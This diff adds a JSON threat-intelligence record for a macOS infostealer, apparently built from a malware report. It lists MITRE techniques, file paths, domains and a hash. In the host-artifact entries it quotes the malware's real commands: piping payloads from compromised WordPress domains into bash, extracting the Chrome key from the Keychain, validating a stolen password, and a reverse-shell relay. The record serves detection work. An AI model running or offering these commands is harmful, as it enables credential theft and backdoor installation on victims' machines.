@@ -1,0 +1,661 @@
+{
+  "malware_family": "ClickLock Stealer",
+  "threat_actor": "ClickLock Dev",
+  "platforms": [
+    "macos",
+    "linux"
+  ],
+  "summary": "ClickLock Stealer is a modular macOS infostealer delivered through ClickFix paste-into-Terminal lures that chains a Cloudflare-themed orchestrator, credential and Keychain stealers, a multi-chain crypto harvester and a GSocket reverse-shell backdoor, exfiltrating everything through Telegram bots and compromised WordPress domains. If the victim refuses the fake password dialog the malware locks the desktop by killing interactive processes at sub-second intervals until compliance, then timestomps and self-deletes while the gs-netcat backdoor persists.",
+  "mitre_techniques": [
+    "T1584",
+    "T1584.001",
+    "T1587",
+    "T1587.001",
+    "T1588.002",
+    "T1608.001",
+    "T1608.002",
+    "T1059",
+    "T1059.002",
+    "T1059.004",
+    "T1204",
+    "T1204.004",
+    "T1543",
+    "T1543.001",
+    "T1027",
+    "T1027.016",
+    "T1036",
+    "T1036.005",
+    "T1036.008",
+    "T1070",
+    "T1070.004",
+    "T1070.006",
+    "T1070.009",
+    "T1564",
+    "T1564.001",
+    "T1564.003",
+    "T1056",
+    "T1056.002",
+    "T1187",
+    "T1539",
+    "T1552",
+    "T1552.001",
+    "T1552.003",
+    "T1555",
+    "T1555.001",
+    "T1555.003",
+    "T1555.005",
+    "T1087",
+    "T1087.001",
+    "T1016",
+    "T1033",
+    "T1057",
+    "T1082",
+    "T1217",
+    "T1518",
+    "T1005",
+    "T1119",
+    "T1560",
+    "T1560.001",
+    "T1560.002",
+    "T1071",
+    "T1071.001",
+    "T1102",
+    "T1102.003",
+    "T1020",
+    "T1030",
+    "T1567",
+    "T1567.002",
+    "T1489"
+  ],
+  "host_artifacts": [
+    {
+      "kind": "file_path",
+      "value": "$HOME/.cacheb/",
+      "context": "Hidden staging directory for credential and keychain stealers",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "$HOME/.cacheb/zoom",
+      "context": "Local copy of zsh.txt credential stealer",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "$HOME/.cacheb/chromer",
+      "context": "Local copy of chromer.txt keychain stealer",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "service_name",
+      "value": "com.authirity",
+      "context": "LaunchAgent label executing $HOME/.cacheb/zoom at load",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "service_name",
+      "value": "com.chromer",
+      "context": "LaunchAgent label executing $HOME/.cacheb/chromer at load",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "~/Library/LaunchAgents/com.authirity.plist",
+      "context": "LaunchAgent persistence for credential stealer (RunAtLoad true)",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "~/Library/LaunchAgents/com.chromer.plist",
+      "context": "LaunchAgent persistence for keychain stealer (RunAtLoad true)",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "~/Library/Application Support/iCloudsync",
+      "context": "gs-netcat backdoor binary disguised as iCloud",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "GSocket",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "process_name",
+      "value": "SystemUIServerl",
+      "context": "Backdoor process masquerades as SystemUIServer with trailing l",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "GSocket",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "$HOME/.cacheb/$(whoami)-chrome-key.txt",
+      "context": "Flag file holding Chrome Safe Storage key extraction result",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "$HOME/.cacheb/$USER.txt",
+      "context": "Flag file written after successful password capture",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "$HOME/.cacheb/.apple",
+      "context": "Success marker written by coercion loops",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "$HOME/.cacheb/setting.png",
+      "context": "Fake macOS system icon downloaded for dialog credibility",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "script.sh",
+      "context": "Orchestrator shell script, entry point of the attack",
+      "specificity": "medium",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "chromer.txt",
+      "context": "Keychain stealer downloaded from panalobet.ph",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "zsh.txt",
+      "context": "Credential stealer downloaded from panalobet.ph",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "finderv2.jpg",
+      "context": "Crypto/credential harvester masquerading as image, pipe-executed",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "goyim",
+      "context": "Modified GSocket deploy.sh installer for gs-netcat backdoor",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "GSocket",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "plist.css",
+      "context": "bash script creating com.authirity.plist LaunchAgent",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "chromer.js",
+      "context": "bash script creating com.chromer.plist LaunchAgent",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "finder_output.txt",
+      "context": "Console output of harvester included in exfiltrated archive",
+      "specificity": "medium",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "CLOUDFLARE CAPTCHA ACCESS CONTROL",
+      "context": "Fake banner shown during ClickFix-style loading animation",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "Access granted. Verification complete. You can now go back to your browser and reload.",
+      "context": "Fake success message closing the social engineering loop",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "successfully detected at ${counter}s",
+      "context": "Marker written to flag file when password/key extraction succeeds",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "Verifying you are not a bot",
+      "context": "Hardcoded fake Cloudflare progress-bar status message",
+      "specificity": "medium",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "Collecting browser signals",
+      "context": "Hardcoded fake Cloudflare progress-bar status message",
+      "specificity": "medium",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "Incorrect password",
+      "context": "Native-looking alert shown when captured password fails dscl validation",
+      "specificity": "medium",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "running chromer $counter",
+      "context": "Debug line printed by keychain coercion kill-loop",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "security find-generic-password -ga \"Chrome\" 2>&1 | awk -F'' '/password:/ {print $2}'",
+      "context": "Keychain query for Chrome Safe Storage key; parent is bash subshell",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "dscl /Local/Default -authonly \"$USER\" \"$PASS\"",
+      "context": "Validates captured macOS login password before exfiltration; parent is script.sh",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "(nohup bash -c \"$(curl -fsSL https://store.grafsynergy.com/media/goyim)\" </dev/null >/dev/null 2>&1) & disown",
+      "context": "GSocket backdoor installer executed in memory; parent is script.sh",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "(curl -fsSL https://panalobet.ph/wp-content/themes/twentytwenty/assets/images/finderv2.jpg | bash -s -- --send >/dev/null 2>&1) &",
+      "context": "Crypto harvester piped directly into bash with --send; parent is script.sh",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "pkill -f \"Google Chrome\" \"Safari\" \"Firefox\" \"Arc\" \"Microsoft Edge\" \"Brave Browser\" 2>/dev/null",
+      "context": "Part of 0.2s coercion loop killing browsers; also targets Finder, Dock, Terminal, Activity Monitor",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "touch -r $HOME/Movies $HOME/.cacheb",
+      "context": "Timestomp of staging directory after password attempt or key success",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "curl -o $HOME/.cache/zoom \"https://panalobet.ph/wp-content/upgrade/zsh.txt\"",
+      "context": "Download of credential stealer into hidden dir; parent is script.sh",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "curl -o $HOME/.cache/chromer \"https://panalobet.ph/wp-content/themes/twentytwenty/assets/fonts/chromer.txt\"",
+      "context": "Download of keychain stealer into hidden dir; parent is script.sh",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "curl \"https://panalobet.ph/wp-content/upgrade/plist.css\" | bash 2>/dev/null",
+      "context": "LaunchAgent installer executed on user cancel; parent is script.sh",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "launchctl load $HOME/Library/LaunchAgents/com.authirity.plist",
+      "context": "Persistence activation of credential stealer by plist.css",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "killall NotificationCenter 2>/dev/null; sleep 0.1",
+      "context": "~6 hour loop suppressing security/notification alerts; parent is script.sh",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "osascript -e 'quit app \"Terminal\"'",
+      "context": "Coercion loop repeatedly quitting GUI apps; parent is bash watchdog script",
+      "specificity": "low",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "trap '' INT",
+      "context": "Disables keyboard interrupts at script start; parent is Terminal pasted command",
+      "specificity": "low",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "tput civis",
+      "context": "Hides terminal cursor before fake progress animation",
+      "specificity": "low",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "rm -- \"$0\"",
+      "context": "Self-deletion after exfiltration, skipped for user \"shutdown\"",
+      "specificity": "low",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "parent_child",
+      "value": "bash -> osascript",
+      "context": "Shell-spawned osascript password dialogs with downloaded Apple icon",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "parent_child",
+      "value": "bash -> security find-generic-password",
+      "context": "Keychain query for Chrome Safe Storage from non-browser parent process",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    }
+  ],
+  "network_artifacts": [
+    {
+      "kind": "domain",
+      "value": "panalobet.ph",
+      "context": "Compromised WordPress host serving all stealers and deng.php exfil endpoint",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "store.grafsynergy.com",
+      "context": "Compromised domain hosting goyim installer and fake apple.png icon",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "cottonbox.co.il",
+      "context": "Compromised domain hosting hbd payload",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "https://panalobet.ph/wp-content/themes/twentytwenty/assets/fonts/chromer.txt",
+      "context": "Keychain stealer download (chromer)",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "https://panalobet.ph/wp-content/upgrade/zsh.txt",
+      "context": "Credential stealer download (zoom)",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "https://panalobet.ph/wp-content/themes/twentytwenty/assets/images/finderv2.jpg",
+      "context": "Crypto stealer download, pipe-executed as finder.sh",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "https://panalobet.ph/wp-content/deng.php",
+      "context": "Server-side endpoint receiving goyim reconnaissance data",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "https://panalobet.ph/wp-content/upgrade/plist.css",
+      "context": "LaunchAgent installer script for com.authirity.plist",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "https://panalobet.ph/wp-content/themes/twentytwenty/assets/fonts/chromer.js",
+      "context": "LaunchAgent installer script for com.chromer.plist",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "https://store.grafsynergy.com/media/goyim",
+      "context": "GSocket backdoor installer piped to bash via nohup",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "https://store.grafsynergy.com/media/apple.png",
+      "context": "Fake Apple icon used in credential-stealer dialog",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "https://cottonbox.co.il/wp-content/hbd",
+      "context": "Additional payload URL on compromised domain",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "other",
+      "value": "gsnc.eu:67",
+      "context": "GSocket relay endpoint for persistent reverse shell",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "GSocket"
+    },
+    {
+      "kind": "url",
+      "value": "https://gsocket.io/bin",
+      "context": "Source of precompiled gs-netcat binary downloaded by installer",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "GSocket"
+    },
+    {
+      "kind": "domain",
+      "value": "api.telegram.org",
+      "context": "Telegram Bot API (sendDocument) used for all exfiltration",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "ifconfig.me",
+      "context": "External IP discovery during fingerprinting",
+      "specificity": "low",
+      "evidence": "prose",
+      "origin_tool": ""
+    }
+  ],
+  "samples": [
+    {
+      "sha256": "3ce0504ba65f8d56f83d7fef45faeaeb31e4e5aa9b872b56610b5f2558231caa",
+      "description": "Orchestrator shell script script.sh, undetected on VirusTotal at discovery (SHA256 as transcribed from Figure 1)"
+    }
+  ],
+  "file_types": [
+    "script"
+  ]
+}
